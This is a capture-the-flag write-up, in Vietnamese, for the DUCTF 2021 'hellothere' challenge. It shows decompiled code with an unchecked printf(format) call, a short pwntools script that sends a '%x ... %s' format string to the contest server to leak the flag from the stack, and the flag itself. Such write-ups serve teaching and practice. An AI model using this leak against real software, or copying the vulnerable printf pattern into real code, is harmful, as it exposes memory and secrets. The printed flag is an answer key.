# HELLOTHERE
Hàm main của Challenge như sau:
```sh
FILE *stream; // [rsp+8h] [rbp-58h]
  char format[32]; // [rsp+10h] [rbp-50h] BYREF
  char s[40]; // [rsp+30h] [rbp-30h] BYREF
  unsigned __int64 v6; // [rsp+58h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  buffer_init();
  stream = fopen("./flag.txt", "r");
  if ( !stream )
  {
    puts("The flag file isn't loading. Please contact an organiser if you are running this on the shell server.");
    exit(0);
  }
  fgets(s, 32, stream);
  while ( 1 )
  {
    puts("What is your name?");
    fgets(format, 32, stdin);
    printf("\nHello there, ");
    printf(format);
    putchar(10);
```

Sử dụng lỗi Format String để leak flag đã được đọc và nằm trên stack.
Sử dụng %s để leak giá trị nằm trên stack.

```sh
from pwn import * 
#s = process("./hellothere")
s = remote("pwn-2021.duc.tf", 31918)
s.sendline("%x %x %x %x %x %s")

s.interactive()

```
### FLAG = DUCTF{f0rm4t_5p3c1f13r_m3dsg!}